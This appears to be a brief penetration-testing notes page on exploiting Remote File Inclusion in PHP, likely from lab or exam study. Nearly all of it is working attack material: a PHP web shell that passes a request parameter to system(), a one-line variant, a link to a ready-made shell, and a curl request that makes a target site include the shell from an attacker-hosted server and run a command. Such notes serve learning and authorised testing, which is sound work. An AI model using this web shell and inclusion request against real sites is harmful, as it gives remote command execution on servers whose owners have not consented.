# RFI

Used when we can reference a file on our kali machine.

We begin by hosting the following `simple-backdoor.php` file on a simple python http server

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

We can also use [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php) or a even simpler one in this context:

```php
<?php system($_GET['cmd']); ?>
```

We can then exploit the RFI via the following request (unless using [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php))

```bash
curl 'http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls'
```
